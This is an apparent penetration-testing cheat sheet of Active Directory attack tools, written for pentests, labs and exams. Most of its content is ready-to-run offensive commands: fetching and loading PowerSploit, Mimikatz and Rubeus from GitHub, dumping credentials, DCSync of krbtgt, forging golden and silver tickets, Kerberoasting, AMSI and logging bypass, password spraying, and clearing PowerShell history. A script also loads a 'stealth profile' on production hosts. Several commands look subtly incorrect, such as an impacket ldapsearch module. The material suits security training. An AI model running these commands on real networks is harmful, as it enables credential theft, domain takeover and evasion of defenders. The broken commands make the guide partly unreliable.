# 🛠️ Active Directory Tools Arsenal - Complete Setup & Loading Guide

> **🎯 PURPOSE**: This is your **complete tool arsenal** for Active Directory enumeration during pentests, labs, and exams. Every tool, setup procedure, and usage workflow is documented here for **immediate deployment**.

[🔄 Back to Master Index](./00_Enumeration_Index.md) | [Next: Network Enumeration](./02_Network_Enumeration.md)

---

## 🚀 **ARSENAL OVERVIEW**

### **🎭 What This Arsenal Provides**
This arsenal contains **every tool** you need for AD enumeration, from basic discovery to advanced exploitation. Each tool includes **complete setup**, **loading procedures**, and **usage examples** ready for immediate deployment.

### **🎯 Arsenal Categories**
- **Core Enumeration Tools**: PowerView, SharpView, BloodHound, SharpHound
- **Advanced Exploitation Tools**: Mimikatz, Rubeus, Impacket, Kekeo
- **Persistence & Post-Exploitation**: PowerUp, GPOZaurr, SharpPersist, DSInternals
- **Stealth & OPSEC**: Invisi-Shell, AMSI bypasses, logging evasion
- **Native Windows Tools**: Built-in commands and utilities
- **Tool Integration**: Workflows and combinations

---

## 📋 **QUICK START TOOL LOADING**

### **⚡ Immediate Tool Deployment**
| **What You Need** | **Quick Command** | **Full Setup** |
|-------------------|-------------------|----------------|
| **Basic AD Enumeration** | `Import-Module ActiveDirectory` | [Core Enumeration Tools](#core-enumeration-tools) |
| **PowerView Functions** | `. .\PowerView.ps1` | [PowerView Complete Setup](#powerview-complete-setup) |
| **BloodHound Analysis** | `Invoke-BloodHound -CollectionMethod All` | [BloodHound Complete Setup](#bloodhound-complete-setup) |
| **Credential Extraction** | `. .\Invoke-Mimikatz.ps1` | [Mimikatz Complete Setup](#mimikatz-complete-setup) |
| **Stealth Execution** | `.\RunWithPathAsAdmin.bat` | [Stealth & OPSEC Tools](#stealth--opsec-tools) |

### **🎯 Environment-Specific Loading**
```powershell
# Production Environment (Stealth Mode)
if($env:COMPUTERNAME -like "*PROD*" -or $env:USERDOMAIN -like "*PROD*") {
    Write-Host "Production environment detected - loading stealth profile" -ForegroundColor Yellow
    Import-Module ActiveDirectory
    Import-Module GroupPolicy
    $env:STEALTH_MODE = $true
} else {
    Write-Host "Lab environment detected - loading full arsenal" -ForegroundColor Green
    . .\PowerView.ps1
    . .\PowerUp.ps1
    . .\Invoke-Mimikatz.ps1
    $env:STEALTH_MODE = $false
}
```

---

## 🔧 **CORE ENUMERATION TOOLS** ^core-enumeration-tools

### **📊 PowerView Complete Setup** ^powerview

#### **What is PowerView?**
**PowerView** is a PowerShell framework for Active Directory enumeration and attack execution. It provides hundreds of functions for discovering, analyzing, and manipulating AD objects.

#### **Setup & Installation**
```powershell
# Step 1: Download PowerView
# Option A: From GitHub (recommended)
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "PowerView.ps1"

# Option B: From local file
# Ensure PowerView.ps1 is in your current directory

# Step 2: Load PowerView into current session
. .\PowerView.ps1

# Step 3: Verify loading
Get-Command -Module PowerView | Measure-Object | Select-Object Count
```

**Expected Output**: Should show count of loaded PowerView functions (typically 100+)

#### **Essential PowerView Functions**
```powershell
# Domain enumeration
Get-Domain                    # Get domain object
Get-DomainController         # Get domain controllers
Get-DomainSID               # Get domain SID

# User enumeration
Get-DomainUser              # Get domain users
Get-DomainUser -SPN        # Get users with SPNs
Get-DomainUser -AdminCount # Get protected users

# Group enumeration
Get-DomainGroup            # Get domain groups
Get-DomainGroupMember      # Get group members
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Computer enumeration
Get-DomainComputer         # Get domain computers
Get-DomainComputer -OperatingSystem "*Windows 10*"

# ACL enumeration
Get-DomainObjectAcl        # Get object ACLs
Find-InterestingDomainAcl  # Find interesting permissions
```

#### **PowerView Usage Examples**
```powershell
# Example 1: Find all users with SPNs (Kerberoasting targets)
$spnUsers = Get-DomainUser -SPN -Properties ServicePrincipalName
$spnUsers | ForEach-Object {
    Write-Host "User: $($_.samaccountname)" -ForegroundColor Cyan
    Write-Host "  SPN: $($_.ServicePrincipalName)" -ForegroundColor White
}

# Example 2: Find computers with unconstrained delegation
$unconstrainedComputers = Get-DomainComputer -TrustedForDelegation -Properties TrustedForDelegation
Write-Host "Found $($unconstrainedComputers.Count) computers with unconstrained delegation" -ForegroundColor Red

# Example 3: Find interesting ACLs
$interestingACLs = Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -like "*GenericAll*" -or
    $_.ActiveDirectoryRights -like "*WriteDACL*"
}
$interestingACLs | Format-Table IdentityReference, ActiveDirectoryRights, ObjectDN
```

#### **PowerView Error Handling**
```powershell
# Common Error: Function not found
try {
    Get-Domain
} catch {
    Write-Host "PowerView not loaded. Loading now..." -ForegroundColor Yellow
    . .\PowerView.ps1
    Get-Domain
}

# Common Error: Insufficient permissions
try {
    Get-DomainUser -Properties * | Select-Object -First 10
} catch {
    Write-Host "Insufficient permissions. Using limited properties..." -ForegroundColor Yellow
    Get-DomainUser -Properties samaccountname,distinguishedname | Select-Object -First 10
}
```

---

### **🔍 SharpView Complete Setup** ^sharpview

#### **What is SharpView?**
**SharpView** is a compiled C# version of PowerView that provides the same functionality without requiring PowerShell execution. This makes it ideal for environments with strict PowerShell restrictions.

#### **Setup & Installation**
```powershell
# Step 1: Download SharpView
# Option A: From GitHub
Invoke-WebRequest -Uri "https://github.com/tevora-threat/SharpView/releases/latest/download/SharpView.exe" -OutFile "SharpView.exe"

# Option B: From local file
# Ensure SharpView.exe is in your current directory

# Step 2: Verify executable
Get-ChildItem SharpView.exe | Select-Object Name, Length, LastWriteTime
```

#### **SharpView Usage Examples**
```powershell
# Example 1: Basic domain enumeration
.\SharpView.exe Get-Domain

# Example 2: User enumeration with SPNs
.\SharpView.exe Get-DomainUser -SPN

# Example 3: Group enumeration
.\SharpView.exe Get-DomainGroup -Identity "Domain Admins"

# Example 4: Computer enumeration
.\SharpView.exe Get-DomainComputer -OperatingSystem "*Windows 10*"
```

#### **SharpView vs PowerView Comparison**
| **Aspect**      | **PowerView**               | **SharpView**          |
| --------------- | --------------------------- | ---------------------- |
| **Execution**   | PowerShell script           | Compiled executable    |
| **Detection**   | Higher (PowerShell logging) | Lower (no PowerShell)  |
| **Flexibility** | High (modifiable)           | Low (static)           |
| **Deployment**  | Easy (copy file)            | Easy (copy executable) |
| **OPSEC**       | Medium                      | High                   |

---

### **🩸 BloodHound Complete Setup** ^bloodhound

#### **What is BloodHound?**
**BloodHound** is a graphical tool for mapping Active Directory attack paths. It uses graph theory to reveal hidden relationships and privilege escalation paths that are difficult to discover manually.

#### **Setup & Installation**

##### **Step 1: SharpHound Data Collection**
```powershell
# Download SharpHound
Invoke-WebRequest -Uri "https://github.com/BloodHoundAD/BloodHound/releases/latest/download/BloodHound-win32-x64.zip" -OutFile "BloodHound.zip"
Expand-Archive -Path "BloodHound.zip" -DestinationPath ".\BloodHound" -Force

# Run SharpHound collection
.\BloodHound\SharpHound.exe -c All -d corp.local

# Expected Output: Creates ZIP file with collected data
# File: 20231201_123456_CORP_BloodHound.zip
```

##### **Step 2: BloodHound UI Setup**
```powershell
# Option A: Windows Application
# Extract BloodHound-win32-x64.zip and run BloodHound.exe

# Option B: Web Interface (if available)
# Start BloodHound web server
.\BloodHound\BloodHound.exe --web
# Access at: http://localhost:8080
```

#### **BloodHound Collection Methods**
```powershell
# Method 1: All collection (comprehensive)
.\SharpHound.exe -c All -d corp.local

# Method 2: Targeted collection (stealth)
.\SharpHound.exe -c Group,User,Computer -d corp.local

# Method 3: Site-specific collection
.\SharpHound.exe -c All -d corp.local -s "HQ-Main"

# Method 4: Custom collection
.\SharpHound.exe -c DCRoles,GPOLocalGroup,LocalGroup,Session -d corp.local
```

#### **BloodHound Analysis Workflow**
```powershell
# Step 1: Import collected data
# In BloodHound UI: Import → Select ZIP file

# Step 2: Run analysis queries
# Pre-built queries available in BloodHound:
# - Find all Domain Admins
# - Find users with SPNs
# - Find computers with unconstrained delegation
# - Find shortest path to Domain Admins

# Step 3: Export results
# Right-click on results → Export → CSV/JSON
```

#### **BloodHound Error Handling**
```powershell
# Common Error: Collection fails due to permissions
try {
    .\SharpHound.exe -c All -d corp.local
} catch {
    Write-Host "Collection failed. Trying limited collection..." -ForegroundColor Yellow
    .\SharpHound.exe -c Group,User,Computer -d corp.local
}

# Common Error: Network connectivity issues
if (-not (Test-NetConnection -ComputerName DC01.corp.local -Port 389 -InformationLevel Quiet)) {
    Write-Host "LDAP connectivity failed. Check network and firewall settings." -ForegroundColor Red
}
```

---

## 🔐 **ADVANCED EXPLOITATION TOOLS**

### **🎭 Mimikatz Complete Setup** ^mimikatz

#### **What is Mimikatz?**
**Mimikatz** is a post-exploitation tool for extracting plaintext passwords, hashes, and Kerberos tickets from memory. It's essential for credential harvesting and privilege escalation.

#### **Setup & Installation**
```powershell
# Step 1: Download Mimikatz
# Option A: From GitHub
Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" -OutFile "mimikatz.zip"
Expand-Archive -Path "mimikatz.zip" -DestinationPath ".\mimikatz" -Force

# Option B: From local file
# Ensure mimikatz.exe is in your current directory

# Step 2: PowerShell wrapper (recommended)
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1" -OutFile "Invoke-Mimikatz.ps1"
. .\Invoke-Mimikatz.ps1
```

#### **Mimikatz Usage Examples**
```powershell
# Example 1: Extract all credentials from memory
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Example 2: Extract Kerberos tickets
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Example 3: DCSync attack (requires DCSync rights)
Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\krbtgt"'

# Example 4: Golden ticket creation
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:KRBTGT_HASH /ptt"'
```

#### **Mimikatz OPSEC Considerations**
```powershell
# OPSEC Profile 1: Stealth (production)
# Use native Windows commands when possible
# Minimize Mimikatz usage

# OPSEC Profile 2: Balanced (lab)
# Use Mimikatz selectively
# Implement delays between operations

# OPSEC Profile 3: Noisy (internal lab)
# Full Mimikatz functionality
# Rapid execution for learning
```

---

### **🎫 Rubeus Complete Setup** ^rubeus

#### **What is Rubeus?**
**Rubeus** is a C# tool for Kerberos abuse and ticket manipulation. It's more focused and stealthy than Mimikatz for Kerberos-specific operations.

#### **Setup & Installation**
```powershell
# Step 1: Download Rubeus
Invoke-WebRequest -Uri "https://github.com/GhostPack/Rubeus/releases/latest/download/Rubeus.exe" -OutFile "Rubeus.exe"

# Step 2: Verify executable
Get-ChildItem Rubeus.exe | Select-Object Name, Length, LastWriteTime
```

#### **Rubeus Usage Examples**
```powershell
# Example 1: AS-REP roasting
.\Rubeus.exe asreproast /user:vulnerable_user /domain:corp.local /outfile:hashes.txt

# Example 2: Kerberoasting
.\Rubeus.exe kerberoast /user:service_account /domain:corp.local /outfile:service_hashes.txt

# Example 3: Golden ticket creation
.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /user:Administrator /ptt

# Example 4: Silver ticket creation
.\Rubeus.exe silver /rc4:SERVICE_ACCOUNT_HASH /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /user:Administrator /service:MSSQLSvc /ptt
```

---

### **🌐 Impacket Complete Setup** ^impacket

#### **What is Impacket?**
**Impacket** is a collection of Python classes for working with network protocols. It includes tools for SMB, LDAP, Kerberos, and other protocols commonly used in AD environments.

#### **Setup & Installation**
```powershell
# Step 1: Install Python (if not already installed)
# Download from: https://www.python.org/downloads/

# Step 2: Install Impacket via pip
pip install impacket

# Step 3: Verify installation
python -c "import impacket; print('Impacket installed successfully')"
```

#### **Impacket Usage Examples**
```powershell
# Example 1: SMB enumeration
python -m impacket.smbclient -no-pass -target-ip 192.168.1.10

# Example 2: LDAP enumeration
python -m impacket.ldapsearch -no-pass -target-ip 192.168.1.10 -domain corp.local

# Example 3: Kerberos ticket extraction
python -m impacket.ticketer -nthash USER_HASH -domain-sid DOMAIN_SID -domain corp.local Administrator

# Example 4: WMI execution
python -m impacket.wmiexec -no-pass -target-ip 192.168.1.10 -command "whoami"
```

---

## 🚀 **PERSISTENCE & POST-EXPLOITATION TOOLS**

### **⚡ PowerUp Complete Setup** ^powerup

#### **What is PowerUp?**
**PowerUp** is a PowerShell module for privilege escalation and persistence. It includes functions for finding and exploiting common misconfigurations.

#### **Setup & Installation**
```powershell
# Step 1: Download PowerUp
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" -OutFile "PowerUp.ps1"

# Step 2: Load PowerUp
. .\PowerUp.ps1

# Step 3: Verify loading
Get-Command -Module PowerUp | Measure-Object | Select-Object Count
```

#### **PowerUp Usage Examples**
```powershell
# Example 1: Find privilege escalation vectors
Invoke-AllChecks

# Example 2: Find unquoted service paths
Get-UnquotedService

# Example 3: Find modifiable service binaries
Get-ModifiableServiceFile

# Example 4: Find modifiable service configurations
Get-ModifiableService

# Example 5: Find modifiable registry keys
Get-RegistryAlwaysInstallElevated
```

---

### **🏗️ GPOZaurr Complete Setup** ^gpouzaurr

#### **What is GPOZaurr?**
**GPOZaurr** is a PowerShell module for Group Policy Object analysis and abuse. It helps identify weak GPO configurations that can be exploited.

#### **Setup & Installation**
```powershell
# Step 1: Install from PowerShell Gallery
Install-Module -Name GPOZaurr -Force

# Step 2: Import module
Import-Module GPOZaurr

# Step 3: Verify installation
Get-Command -Module GPOZaurr | Measure-Object | Select-Object Count
```

#### **GPOZaurr Usage Examples**
```powershell
# Example 1: Find all GPOs
Get-GPOZaurr -Verbose

# Example 2: Find GPOs with weak security
Get-GPOZaurr -Type GPO -Verbose | Where-Object {$_.GPOStatus -eq "AllSettingsDisabled"}

# Example 3: Find GPOs with scheduled tasks
Get-GPOZaurr -Type GPOScheduledTask -Verbose

# Example 4: Find GPOs with startup scripts
Get-GPOZaurr -Type GPOScript -Verbose
```

---

## 🕵️ **STEALTH & OPSEC TOOLS**

### **👻 Invisi-Shell Complete Setup** ^invisi-shell

#### **What is Invisi-Shell?**
**Invisi-Shell** is a tool for bypassing AMSI (Antimalware Scan Interface) and PowerShell logging. It's essential for stealth operations in monitored environments.

#### **Setup & Installation**
```powershell
# Step 1: Download Invisi-Shell
# Clone the repository or download from GitHub
git clone https://github.com/OmerYa/Invisi-Shell.git

# Step 2: Navigate to directory
cd Invisi-Shell

# Step 3: Run as administrator (required)
.\RunWithPathAsAdmin.bat
```

#### **Invisi-Shell Usage Examples**
```powershell
# Example 1: Basic AMSI bypass
.\RunWithPathAsAdmin.bat

# Example 2: Non-admin bypass
.\RunWithRegistryNonAdmin.bat

# Example 3: Custom bypass
.\RunWithCustomDll.bat

# Expected Result: PowerShell session with AMSI and logging bypassed
```

#### **Invisi-Shell Verification**
```powershell
# Verify AMSI is bypassed
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)

# Expected Output: True (AMSI bypassed) or False (AMSI active)

# Verify logging is bypassed
Get-EventLog -LogName "Windows PowerShell" -Newest 5
# Should show minimal or no PowerShell events
```

---

## 🪟 **NATIVE WINDOWS TOOLS**

### **🔍 Built-in AD Commands** ^built-in-ad-commands
```powershell
# Domain information
nltest /dsgetdc:corp.local
nltest /domain_trusts

# User and group management
net user /domain
net group /domain
net group "Domain Admins" /domain

# Computer management
net view /domain
net view \\DC01

# Session management
quser /server:DC01
qwinsta /server:DC01
```

### **🔧 Registry and WMI Tools**
```powershell
# Registry queries
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA

# WMI queries
Get-WmiObject -Class Win32_ComputerSystem
Get-WmiObject -Class Win32_OperatingSystem
Get-WmiObject -Class Win32_Service | Where-Object {$_.Name -like "*SQL*"}
```

### **🌐 Network and DNS Tools**
```powershell
# DNS queries
nslookup corp.local
Resolve-DnsName -Type SRV _ldap._tcp.dc._msdcs.corp.local

# Network connectivity
Test-NetConnection -ComputerName DC01.corp.local -Port 389
Test-NetConnection -ComputerName DC01.corp.local -Port 445
```

---

## 🔗 **TOOL INTEGRATION & WORKFLOWS**

### **🎯 Complete Enumeration Workflow**
```powershell
# Phase 1: Stealth Discovery (MS-signed tools only)
Write-Host "Phase 1: Stealth Discovery" -ForegroundColor Green
Import-Module ActiveDirectory
$domain = Get-ADDomain
$dcs = Get-ADDomainController -Filter *
Write-Host "Domain: $($domain.Name)" -ForegroundColor Cyan
Write-Host "DCs: $($dcs.Count)" -ForegroundColor Cyan

# Phase 2: Enhanced Enumeration (PowerView)
Write-Host "Phase 2: Enhanced Enumeration" -ForegroundColor Green
. .\PowerView.ps1
$users = Get-DomainUser -Properties samaccountname,distinguishedname | Select-Object -First 100
$groups = Get-DomainGroup -Properties member | Select-Object -First 50
Write-Host "Users: $($users.Count)" -ForegroundColor Cyan
Write-Host "Groups: $($groups.Count)" -ForegroundColor Cyan

# Phase 3: Attack Path Mapping (BloodHound)
Write-Host "Phase 3: Attack Path Mapping" -ForegroundColor Green
.\SharpHound.exe -c All -d $domain.Name
Write-Host "BloodHound data collection completed" -ForegroundColor Green

# Phase 4: Credential Harvesting (Mimikatz)
Write-Host "Phase 4: Credential Harvesting" -ForegroundColor Green
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### **🔄 Tool Chaining Examples**
```powershell
# Example 1: SPN Discovery → Kerberoasting → Lateral Movement
$spnUsers = Get-DomainUser -SPN -Properties ServicePrincipalName
foreach($user in $spnUsers) {
    Write-Host "Kerberoasting: $($user.samaccountname)" -ForegroundColor Yellow
    # Use Rubeus or Mimikatz for actual Kerberoasting
}

# Example 2: Unconstrained Delegation → Ticket Capture → Privilege Escalation
$unconstrainedComputers = Get-DomainComputer -TrustedForDelegation
foreach($computer in $unconstrainedComputers) {
    Write-Host "Monitoring: $($computer.name)" -ForegroundColor Yellow
    # Use Mimikatz for ticket capture
}

# Example 3: Weak ACLs → Permission Abuse → Privilege Escalation
$interestingACLs = Find-InterestingDomainAcl -ResolveGUIDs
foreach($acl in $interestingACLs) {
    Write-Host "Interesting ACL: $($acl.ObjectDN)" -ForegroundColor Yellow
    # Use PowerUp or custom scripts for exploitation
}
```

---

## 🚨 **DETECTION & OPSEC**

### **👁️ Detection Vectors**
```powershell
# Event IDs to monitor
$detectionEvents = @(
    "4103",  # PowerShell execution
    "4104",  # Script block logging
    "4105",  # Module logging
    "4106",  # Script execution
    "4662",  # Object access
    "5136",  # Directory service changes
    "4624",  # Logon
    "4625"   # Logon failure
)

Write-Host "Monitor these Event IDs for tool detection:" -ForegroundColor Red
$detectionEvents | ForEach-Object { Write-Host "  Event ID: $_" -ForegroundColor White }
```

### **🕵️ OPSEC Best Practices**
```powershell
# OPSEC Profile 1: Stealth (Production)
$stealthProfile = @{
    UseNativeTools = $true
    DelayRange = @(3, 7)
    JitterPattern = "Random"
    MaxConcurrentQueries = 1
    ToolSelection = "MS-signed only"
}

# OPSEC Profile 2: Balanced (Lab)
$balancedProfile = @{
    UseNativeTools = $false
    DelayRange = @(2, 5)
    JitterPattern = "Random"
    MaxConcurrentQueries = 3
    ToolSelection = "Selective offensive tools"
}

# OPSEC Profile 3: Noisy (Internal Lab)
$noisyProfile = @{
    UseNativeTools = $false
    DelayRange = @(1, 3)
    JitterPattern = "Fixed"
    MaxConcurrentQueries = 10
    ToolSelection = "Full arsenal"
}
```

---

## 🧹 **CLEANUP & MAINTENANCE**

### **🗑️ Tool Cleanup**
```powershell
# Remove downloaded tools
$toolsToRemove = @(
    "PowerView.ps1",
    "PowerUp.ps1",
    "Invoke-Mimikatz.ps1",
    "SharpView.exe",
    "Rubeus.exe",
    "SharpHound.exe",
    "mimikatz.exe"
)

foreach($tool in $toolsToRemove) {
    if(Test-Path $tool) {
        Remove-Item $tool -Force
        Write-Host "Removed: $tool" -ForegroundColor Green
    }
}

# Clear PowerShell history
Clear-History
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
```

### **🔒 Security Restoration**
```powershell
# Restore AMSI if modified
if((Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\AMSI" -Name "AmsiEnable" -ErrorAction SilentlyContinue).AmsiEnable -eq 0) {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\AMSI" -Name "AmsiEnable" -Value 1
    Write-Host "Restored AMSI protection" -ForegroundColor Green
}

# Restore PowerShell logging if modified
if((Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -ErrorAction SilentlyContinue).EnableScriptBlockLogging -eq 0) {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
    Write-Host "Restored PowerShell logging" -ForegroundColor Green
}
```

---

## 📋 **COMPLETE TOOL ARSENAL**

### **🕵️ ENUMERATION & RECON TOOLS**

#### **1. 🎭 PowerView - The AD Enumeration Swiss Army Knife** ^tool-powerview
**Purpose**: PowerShell framework for comprehensive AD enumeration and attack execution
**Setup**: `. .\PowerView.ps1`
**Usage**: `Get-Domain`, `Get-DomainUser`, `Find-InterestingDomainAcl`
**Reference**: [04_Domain_Enumeration.md](./04_Domain_Enumeration.md), *Coming Soon*

#### **2. 🔍 SharpView - Compiled PowerView (C#)** ^tool-sharpview
**Purpose**: C# version of PowerView without PowerShell execution
**Setup**: Download `SharpView.exe`
**Usage**: `.\SharpView.exe Get-Domain`
**Reference**: [04_Domain_Enumeration.md](./04_Domain_Enumeration.md)

#### **3. 🩸 BloodHound - The AD Attack Path Mapper** ^tool-bloodhound
**Purpose**: Graph-based AD attack path mapping and visualization
**Setup**: Download BloodHound UI + SharpHound collector
**Usage**: `Invoke-BloodHound -CollectionMethod All`
**Reference**: *Coming Soon*

#### **4. 🔍 SharpHound (C#) - The BloodHound Data Collector**
**Purpose**: C# collector for BloodHound data
**Setup**: Download `SharpHound.exe`
**Usage**: `.\SharpHound.exe -c All -d corp.local`
**Reference**: *Coming Soon*

#### **5. 🧼 SOAPHound - The Stealthy AD Enumerator**
**Purpose**: Stealthy AD enumeration via SOAP
**Setup**: Download SOAPHound scripts
**Usage**: SOAP-based enumeration for stealth operations
**Reference**: *Coming Soon*

#### **6. ☁️ AzureHound - The Azure AD BloodHound Collector**
**Purpose**: BloodHound collector for Azure AD environments
**Setup**: Download AzureHound collector
**Usage**: Azure AD enumeration and attack path mapping
**Reference**: *Coming Soon*

#### **7. 📊 ADRecon - The PowerShell AD Enumeration Toolkit**
**Purpose**: PowerShell-based AD enumeration with Excel export
**Setup**: Download ADRecon scripts
**Usage**: Comprehensive AD enumeration with structured output
**Reference**: [04_Domain_Enumeration.md](./04_Domain_Enumeration.md)

#### **8. 🏰 PingCastle - The AD Security Posture Assessor**
**Purpose**: AD security posture assessment and scoring
**Setup**: Download PingCastle executable
**Usage**: Security assessment and risk scoring
**Reference**: [04_Domain_Enumeration.md](./04_Domain_Enumeration.md)

#### **9. 🔍 LDAPDomainDump - The Python LDAP Enumeration Tool**
**Purpose**: Python tool for dumping AD info over LDAP
**Setup**: `pip install ldapdomaindump`
**Usage**: LDAP-based AD enumeration
**Reference**: [04_Domain_Enumeration.md](./04_Domain_Enumeration.md)

#### **10. 🧭 Seatbelt - The C# System Situational Awareness Tool**
**Purpose**: C# system situational awareness including AD details
**Setup**: Download Seatbelt executable
**Usage**: System enumeration and AD information gathering
**Reference**: *Coming Soon*

---

### **💉 CREDENTIAL ACCESS & KERBEROS ABUSE TOOLS**

#### **11. 🎭 Mimikatz - The Credential Extraction Master**
**Purpose**: Credential extraction, Kerberos abuse, ticket manipulation
**Setup**: Download `mimikatz.exe` or use PowerShell wrapper
**Usage**: `Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'`
**Reference**: *Coming Soon*, *Coming Soon*

#### **12. 🛡️ SafetyKatz - The AMSI-Bypassing Mimikatz**
**Purpose**: Mimikatz reimplementation with AMSI bypass
**Setup**: Download SafetyKatz executable
**Usage**: Credential extraction with built-in evasion
**Reference**: *Coming Soon*

#### **13. 🎪 Kekeo - The Kerberos Ticket Manipulator**
**Purpose**: Kerberos attacks (tickets, silver/golden)
**Setup**: Download Kekeo executable
**Usage**: Advanced Kerberos ticket manipulation
**Reference**: *Coming Soon*

#### **14. 🧰 Impacket Toolkit - The Python Network Protocol Suite**
**Purpose**: Python library/tools for network protocols
**Setup**: `pip install impacket`
**Usage**: `python -m impacket.smbclient`, `python -m impacket.wmiexec`
**Reference**: *Coming Soon*, *Coming Soon*

#### **15. 🗡️ SharpKatz - The C# Mimikatz Port**
**Purpose**: Mimikatz ported to C#
**Setup**: Download SharpKatz executable
**Usage**: C# version of Mimikatz functionality
**Reference**: *Coming Soon*

#### **16. 👻 GhostPack Rubeus - The Enhanced Kerberos Toolkit**
**Purpose**: For Kerberos attacks (AS-REP roasting, ticket harvesting)
**Setup**: Download Rubeus executable
**Usage**: `.\Rubeus.exe asreproast`, `.\Rubeus.exe kerberoast`
**Reference**: *Coming Soon*, *Coming Soon*

#### **17. 🧂 ASREPRoast - The AS-REP Roasting Specialist**
**Purpose**: Extract AS-REP roastable accounts
**Setup**: Download ASREPRoast scripts
**Usage**: AS-REP roasting enumeration
**Reference**: *Coming Soon*

#### **18. 🔐 Kerbrute - The Kerberos Username Enumeration Tool**
**Purpose**: Username enumeration, password spraying via Kerberos
**Setup**: Download Kerbrute executable
**Usage**: Kerberos-based username enumeration
**Reference**: *Coming Soon*

---

### **🚪 LATERAL MOVEMENT & PRIVILEGE ESCALATION TOOLS**

#### **19. ⚡ SharpExec - The Remote Code Execution Toolkit**
**Purpose**: Remote code execution (WMI, PSRemoting, etc.)
**Setup**: Download SharpExec executable
**Usage**: Remote execution via various protocols
**Reference**: *Coming Soon*, *Coming Soon*

#### **20. 🚀 PsExec - The Classic Lateral Movement Tool**
**Purpose**: Classic lateral movement (Sysinternals)
**Setup**: Download PsExec from Sysinternals
**Usage**: `psexec \\target command`
**Reference**: *Coming Soon*

#### **21. 🗡️ CrackMapExec (CME) - The Swiss Army Knife**
**Purpose**: Swiss army knife for SMB/AD exploitation
**Setup**: `pip install crackmapexec`
**Usage**: `crackmapexec smb targets.txt -u users.txt -p passwords.txt`
**Reference**: *Coming Soon*, *Coming Soon*

#### **22. 🔐 SharpDPAPI - The DPAPI Secrets Extractor**
**Purpose**: Dump and decrypt Windows DPAPI secrets
**Setup**: Download SharpDPAPI executable
**Usage**: DPAPI secrets extraction
**Reference**: *Coming Soon*

#### **23. 🧪 LaZagne - The Credential Dumping Toolkit**
**Purpose**: Credential dumping (browsers, apps, AD creds)
**Setup**: Download LaZagne executable
**Usage**: Comprehensive credential extraction
**Reference**: *Coming Soon*

#### **24. 👑 Empire - The Post-Exploitation Framework**
**Purpose**: Post-exploitation framework with AD modules
**Setup**: Download Empire framework
**Usage**: Advanced post-exploitation with AD focus
**Reference**: *Coming Soon*

#### **25. 🔮 Covenant - The .NET C2 Framework**
**Purpose**: .NET C2 framework with AD-focused tooling
**Setup**: Download Covenant framework
**Usage**: .NET-based command and control
**Reference**: *Coming Soon*

---

### **🧿 PERSISTENCE & DEFENSE EVASION TOOLS**

#### **26. 🗄️ DSInternals - The AD Database Secrets Extractor**
**Purpose**: AD database secrets extraction (NTDS.dit, replication)
**Setup**: `Install-Module DSInternals`
**Usage**: AD database analysis and secrets extraction
**Reference**: *Coming Soon*

#### **27. 🔄 SharpPersist - The C# Persistence Toolkit**
**Purpose**: Persistence techniques in C#
**Setup**: Download SharpPersist executable
**Usage**: Advanced persistence techniques
**Reference**: *Coming Soon*

#### **28. 🗡️ PowerSploit - The Post-Exploitation Framework**
**Purpose**: Post-exploitation scripts (includes AD modules)
**Setup**: Download PowerSploit scripts
**Usage**: `. .\PowerUp.ps1`, `. .\Invoke-Mimikatz.ps1`
**Reference**: *Coming Soon*, *Coming Soon*

#### **29. 👹 Evil-WinRM - The WinRM Exploitation Tool**
**Purpose**: Exploiting WinRM with creds/tickets
**Setup**: `gem install evil-winrm`
**Usage**: WinRM-based lateral movement
**Reference**: *Coming Soon*

#### **30. 🎭 ADFSDump / ADFSSpoof - The AD FS Token Tools**
**Purpose**: Extracting and abusing AD FS tokens
**Setup**: Download ADFSDump/ADFSSpoof tools
**Usage**: AD FS token manipulation
**Reference**: *Coming Soon*

#### **31. 🌉 Ligolo-ng - The Advanced Tunneling Tool**
**Purpose**: Advanced tunneling tool (most important)
**Setup**: Download Ligolo-ng binaries
**Usage**: Advanced network tunneling and pivoting
**Reference**: [02_Network_Enumeration.md](./02_Network_Enumeration.md)

#### **32. 🗡️ Nmap - The Network Discovery Swiss Army Knife**
**Purpose**: Comprehensive network discovery, port scanning, and service enumeration
**Setup**: Download from https://nmap.org/download.html or use package manager
**Usage**: `nmap -sS -sV -O 192.168.1.0/24`, `nmap -p 80,443,3389,445 target`
**Reference**: [02_Network_Enumeration.md](./02_Network_Enumeration.md)

#### **33. 🚀 Masscan - The High-Speed Port Scanner** ^masscan
**Purpose**: Ultra-fast port scanning for large networks
**Setup**: Download from https://github.com/robertdavidgraham/masscan
**Usage**: `masscan 192.168.1.0/24 -p 80,443,3389,445 --rate 10000`
**Reference**: [02_Network_Enumeration.md](./02_Network_Enumeration.md)

#### **34. 🔌 Netcat - The Network Swiss Army Knife** ^netcat
